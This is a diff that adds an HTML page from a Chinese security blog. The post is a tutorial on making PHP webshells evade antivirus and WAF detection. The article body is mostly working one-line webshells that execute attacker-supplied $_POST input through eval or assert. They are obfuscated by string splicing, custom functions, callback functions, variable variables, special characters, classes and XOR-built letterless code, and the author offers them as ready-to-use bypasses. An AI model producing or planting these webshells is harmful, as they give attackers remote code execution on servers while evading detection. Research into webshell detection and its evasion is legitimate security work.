@@ -1,0 +1,290 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>webshell多种方法免杀 | Zeo's Security Lab</title><meta name="author" content="Zeo"><meta name="copyright" content="Zeo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x00 前提  -2020 最后一天了，这个月其实没有完整的写完东西，这是以前的存货了，应为生病了，真的的难受的不行，什么也干不了，天天站不行坐不行，躺着也不行了。。。哎。。。总之身体真的很重要，别搞坏了身体！！！ webshell这个东西对于web方向的还是极其重要的，getshell被杀了很难受，于是来研究一波自己的免杀马儿，毕竟别人没有自己的好用，而且分享出来分分钟被杀。 在本篇文章中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webshell多种方法免杀">
+<meta property="og:url" content="https://godzeo.github.io/2020/12/31/webshell%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95%E5%85%8D%E6%9D%80/index.html">
+<meta property="og:site_name" content="Zeo&#39;s Security Lab">
+<meta property="og:description" content="0x00 前提  -2020 最后一天了，这个月其实没有完整的写完东西，这是以前的存货了，应为生病了，真的的难受的不行，什么也干不了，天天站不行坐不行，躺着也不行了。。。哎。。。总之身体真的很重要，别搞坏了身体！！！ webshell这个东西对于web方向的还是极其重要的，getshell被杀了很难受，于是来研究一波自己的免杀马儿，毕竟别人没有自己的好用，而且分享出来分分钟被杀。 在本篇文章中">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-12-31T05:39:23.000Z">
+<meta property="article:modified_time" content="2022-10-12T16:32:06.972Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://godzeo.github.io/2020/12/31/webshell%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95%E5%85%8D%E6%9D%80/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'webshell多种方法免杀',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-10-13 00:32:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Zeo's Security Lab" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Zeo's Security Lab</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">webshell多种方法免杀</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-31T05:39:23.000Z" title="发表于 2020-12-31 13:39:23">2020-12-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-12T16:32:06.972Z" title="更新于 2022-10-13 00:32:06">2022-10-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="webshell多种方法免杀"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><span id="more"></span>
+
+<h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><ul>
+<li><input checked="" disabled="" type="checkbox"> -2020 最后一天了，这个月其实没有完整的写完东西，这是以前的存货了，应为生病了，真的的难受的不行，什么也干不了，天天站不行坐不行，躺着也不行了。。。哎。。。总之身体真的很重要，别搞坏了身体！！！</li>
+<li>webshell这个东西对于web方向的还是极其重要的，getshell被杀了很难受，于是来研究一波自己的免杀马儿，毕竟别人没有自己的好用，而且分享出来分分钟被杀。</li>
+<li>在本篇文章中将会介绍一些常用的木马免杀技巧</li>
+</ul>
+<h1 id="0x01-检测情况"><a href="#0x01-检测情况" class="headerlink" title="0x01 检测情况"></a>0x01 检测情况</h1><ul>
+<li>WAF一般都是维护一个规则库，记录webshell常用的函数、方法等等，通过这个规则库匹配从而检测是否是木马。</li>
+<li>当匹配上对应特征时就是告警，但是规则匹配肯定会有误报，waf一直告警也很烦，所以waf一般会稳定为首要目标，也会放宽一下规则，这就是绕的基础</li>
+</ul>
+<p>查杀软件我首先：D盾</p>
+<p>『D盾_防火墙』专为IIS设计的一个主动防御的保护软件,以内外保护的方式 防止网站和服务器给入侵,在正常运行各类网站的情 况下，越少的功能，服务器越安全的理念而设计！ 限制了常见的入侵方法，让服务器更安全!</p>
+<h1 id="0x02-PHP一句话"><a href="#0x02-PHP一句话" class="headerlink" title="0x02 PHP一句话"></a>0x02 PHP一句话</h1><p>这次主要是对php的一句话免杀实验</p>
+<p>首先我们先看一下最常见的php一句话</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>解析一下：</p>
+<ul>
+<li>其中 eval () 就是执行命令的函数，</li>
+<li>$_POST[‘a’] 就是接收的数据的函数，a是传递的参数。</li>
+<li>eval函数把接收的数据当作PHP代码来执行。</li>
+<li>这便是一句话木马</li>
+</ul>
+<p>我更加喜爱assert函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert(@$_POST[&#x27;a&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>原因：</p>
+<p>php5和php7是有差异的</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>eval</td>
+<td>PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为PHP代码执行</td>
+</tr>
+<tr>
+<td>assert</td>
+<td>PHP 4, PHP 5, PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8版本后可以接受两个参数</td>
+</tr>
+</tbody></table>
+<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p>
+<p>php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码。</p>
+<p>相同点：二者都可以执行PHP语句。只不过是，eval规范更加严格一些，必须符合PHP代码要求。而assert则没有那么严格，执行PHP表达式即可。</p>
+<p>简单点说就是：</p>
+<p>eval() 是一个语言构造器而不是一个函数，不能被 可变函数 调用</p>
+<p>assert() 可以被可变函数调用，例如诸多的回调函数，这样就方便了许多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$func = $_GET[&quot;func&quot;];</span><br><span class="line">assert(&quot;$func()&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"># 这也是一个一句话，</span><br></pre></td></tr></table></figure>
+
+<p>0x03 assert函数</p>
+<p>assert是一个断言函数，当assert进行判断时，如果为false，则会发出Warning的提醒，但是依然会继续向下执行。对于调试很好，尤其是可以使用回调函数的时候，如果对用户输入的数据过滤不严谨的话，assert的危害比eval还要大。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/54ce1ed4787903cfc0409ab4cf05eb82.png" alt="image-20201231133401683"></p>
+<p>便需要结合不同编程语言要有不同的应对方式，我用php做实例，总的思路就是：要刨除代码和函数的关系</p>
+<p>大体有以下几个思路：</p>
+<ul>
+<li>字符串变换（拼接、编码、等等。。。）</li>
+<li>函数特性</li>
+<li>类特性</li>
+<li>混合免杀</li>
+<li>奇思妙想</li>
+</ul>
+<h1 id="0x03-字符串变换"><a href="#0x03-字符串变换" class="headerlink" title="0x03 字符串变换"></a>0x03 字符串变换</h1><p>单纯的字符串变化还是有可疑，我们还需要配合其他</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">substr_replace</span>(<span class="string">&quot;xxser&quot;</span>,<span class="string">&quot;asser&quot;</span>,-<span class="number">3</span>);</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$aa</span>[<span class="number">1</span>].<span class="title function_ invoke__">chr</span>(<span class="string">&#x27;116&#x27;</span>);</span><br><span class="line"><span class="variable">$fun</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/xx/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$cc</span> = <span class="title function_ invoke__">substr_replace</span>(<span class="string">&quot;&quot;</span>,<span class="variable">$fun</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cc</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d2829e597eaf07c368fa4eff6929aa01.png" alt="image-20201231133428867"></p>
+<h1 id="0x04-函数特性"><a href="#0x04-函数特性" class="headerlink" title="0x04 函数特性"></a>0x04 函数特性</h1><p>函数特性里面我知道的有：</p>
+<ul>
+<li>自定义函数绕过</li>
+<li>变形回调</li>
+<li>数组</li>
+<li>可变变量</li>
+</ul>
+<h1 id="自定义函数绕过"><a href="#自定义函数绕过" class="headerlink" title="自定义函数绕过"></a>自定义函数绕过</h1><p>纯自定义函数还是可以绕过的</p>
+<p>下面是送大家的免杀马,估计过几天就废了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">function zeo($b)&#123;</span><br><span class="line">    return $b;</span><br><span class="line">&#125;</span><br><span class="line">function ass($a)&#123;</span><br><span class="line">    return eval($a);</span><br><span class="line">&#125;</span><br><span class="line">function post()&#123;</span><br><span class="line">    return $_POST[&#x27;x&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function run()&#123;</span><br><span class="line">	return zeo(ass)(zeo(post)());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">zeo(ass)(zeo(post)());</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/646a82028945301a6edeb1f37503362a.png" alt="image-20201231133441831"></p>
+<h1 id="回调函数-组合绕过"><a href="#回调函数-组合绕过" class="headerlink" title="回调函数+组合绕过"></a>回调函数+组合绕过</h1><p>这个现在有点费劲了,找了下面这些</p>
+<p>大部分都已经被拉黑了。。。单独用都得死</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array()</span><br><span class="line">call_user_func()</span><br><span class="line">array_filter() </span><br><span class="line">array_walk()  </span><br><span class="line">array_map()</span><br><span class="line">array_reduce()</span><br><span class="line">array_walk() </span><br><span class="line">array_walk_recursive()</span><br><span class="line">filter_var() </span><br><span class="line">filter_var_array() </span><br><span class="line">uasort() </span><br><span class="line">uksort() </span><br><span class="line">registregister_shutdown_function()</span><br><span class="line">register_tick_function()</span><br><span class="line">forward_static_call_array(assert,array($_POST[x]));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>所以只能稍微配合上面的内容，奉献下面的免杀马</li>
+<li>这个那就是定义个函数加个简单的拼接</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function zeo($c,$d)&#123;</span><br><span class="line">	pj()($c,$d);</span><br><span class="line">&#125;</span><br><span class="line">function pj()&#123;</span><br><span class="line">	return &quot;register_shut&quot;.&quot;down_function&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=$_POST[&#x27;x&#x27;];</span><br><span class="line">zeo(assert,$b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fa6fd1f374f10247944b393aafb32dc0.png" alt="image-20201231133455779"></p>
+<h1 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h1><h1 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h1><p>考虑见要执行的一句话木马程序放到数组中执行达到绕过的目的</p>
+<p>下面也是老样子，免杀马送上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b = substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);</span><br><span class="line">$a = array($arrayName = ($arrayName =($arrayName = array(&#x27;a&#x27; =&gt; $b($_POST[&#x27;x&#x27;])))));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a6131508739c99c0eecd26f790efbc31.png" alt="image-20201231133508080"></p>
+<h1 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h1><p>PHP中有一种变量叫做可变变量，这种变量不是一种基础类型的变量。可变变量是指一个普通变量的值可以作为另一个变量的名称被使用。这句话听起来有些抽象。我们可以通过实例来展示可变变量的定义以及实用。</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = &#x27;hello&#x27;;</span><br><span class="line">$$a = &#x27;world&#x27;;</span><br><span class="line">echo $hello;</span><br><span class="line"># 输出就是world</span><br></pre></td></tr></table></figure>
+
+<p>在上面这段代码中，第一行是一个普通的变量定义，变量名称为a，变量值为hello。</p>
+<p>第二行使用变量a的值，定义了一个变量，这个变量的名字叫做hello（也就是a的值），值为world。</p>
+<p>将这个变量输出之后的结果是：world。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$zeo=&#x27;dalao&#x27;;</span><br><span class="line">$$zeo=$_POST[&#x27;x&#x27;];</span><br><span class="line">eval($dalao);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/zy/Library/Application%20Support/typora-user-images/image-20200407220547482.png" alt="image-20200407220547482"></p>
+<p>不行了，这个已经有点问题了，那么只能把eval函数在再处理一下，要结合下面的特殊字符干扰</p>
+<h1 id="0x05-特殊字符干扰"><a href="#0x05-特殊字符干扰" class="headerlink" title="0x05 特殊字符干扰"></a>0x05 特殊字符干扰</h1><ul>
+<li>要求是能干扰到杀软的正则判断，还要代码能执行。</li>
+<li>这个可以自己fuzz</li>
+<li>大概就是说各种回车、换行、null和空白字符</li>
+<li>我这里试了一下成功了，配合上面的可变变量</li>
+</ul>
+<p>下面送上免杀马一个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$zeo=&#x27;dalao&#x27;;</span><br><span class="line">$$zeo=$_POST[&#x27;x&#x27;];</span><br><span class="line">eval(``.$dalao);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a6131508739c99c0eecd26f790efbc31.png"></p>
+<h1 id="0x06-使用类绕过"><a href="#0x06-使用类绕过" class="headerlink" title="0x06 使用类绕过"></a>0x06 使用类绕过</h1><p>类现在发现好多人在用，这个好像D盾检测的最轻，用类自然就少不了魔法函数</p>
+<p>简单构造一个类的免杀马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class zeo2</span><br><span class="line">&#123;</span><br><span class="line">  public $b =&#x27;&#x27;;</span><br><span class="line">  </span><br><span class="line">  function post()&#123;</span><br><span class="line">    return $_POST[&#x27;x&#x27;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">class zeo extends zeo2</span><br><span class="line">&#123;</span><br><span class="line">  public $code=null;</span><br><span class="line">  function __construct()&#123;</span><br><span class="line">  	$code=parent::post();</span><br><span class="line">    assert($code);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$blll = new zeo;</span><br><span class="line">$bzzz = new zeo2;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/44d273bb647591a3153c24c47734eb6a.png" alt="image-20201231133525255"></p>
+<h1 id="0x07-还有一种无字母的马"><a href="#0x07-还有一种无字母的马" class="headerlink" title="0x07 还有一种无字母的马"></a>0x07 还有一种无字母的马</h1><p>主要思路就是：</p>
+<ul>
+<li>没有字母，简单来说就是字母被替代了</li>
+<li>就是用各种运算，例如异或，拼装出来想要的函数</li>
+<li>最后能构造出a-z中任意一个字符。</li>
+<li>然后再利用PHP允许动态函数执行的特点，</li>
+<li>拼接处一个函数名，如“assert”，然后动态执行之即可。</li>
+</ul>
+<p>参考P牛的，这个讲的已经很清楚，想了解的可以看看</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p>我送上一道之前做的题，异曲同工，很有意思。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$_++;</span><br><span class="line">$__ = (&quot;`&quot; ^ &quot;?&quot;) . (&quot;:&quot; ^ &quot;&#125;&quot;) . (&quot;%&quot; ^ &quot;`&quot;) . (&quot;&#123;&quot; ^ &quot;/&quot;);</span><br><span class="line">$___ = (&quot;$&quot; ^ &quot;&#123;&quot;) . (&quot;~&quot; ^ &quot;.&quot;) . (&quot;/&quot; ^ &quot;`&quot;) . (&quot;-&quot; ^ &quot;~&quot;) . (&quot;(&quot; ^ &quot;|&quot;);</span><br><span class="line">(&#x27;%05&#x27;^&#x27;`&#x27;)</span><br><span class="line">#  “^”为异或运算符,在PHP中,两个变量进行异或时,会将字符串转换成二进制再进行异或运算,异或运算完，又将结果从二进制转换成了字符串。</span><br><span class="line">$&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h1><ul>
+<li>感觉下来一句话的免杀还是比较简单的，单一的方法不太好多，但是组合几个方法还是很方便的。</li>
+<li>个人感觉PHP免杀的要点就在于PHP允许动态函数执行的特点，提供很多的思路。</li>
+<li>后续就是研究流量的免杀和菜刀的免杀了。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://godzeo.github.io">Zeo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://godzeo.github.io/2020/12/31/webshell%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95%E5%85%8D%E6%9D%80/">https://godzeo.github.io/2020/12/31/webshell%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95%E5%85%8D%E6%9D%80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://godzeo.github.io" target="_blank">Zeo's Security Lab</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20Apache%20Flink%20CVE-2020-17519%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">漏洞复现 Apache Flink CVE-2020-17519 任意文件读取漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2020/11/23/WordPress%20xmlrpc.php%20SSRF%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">WordPress xmlrpc.php SSRF漏洞复现</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zeo</div><div class="author-info__description">专注于安全,分享生活,分享知识</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my 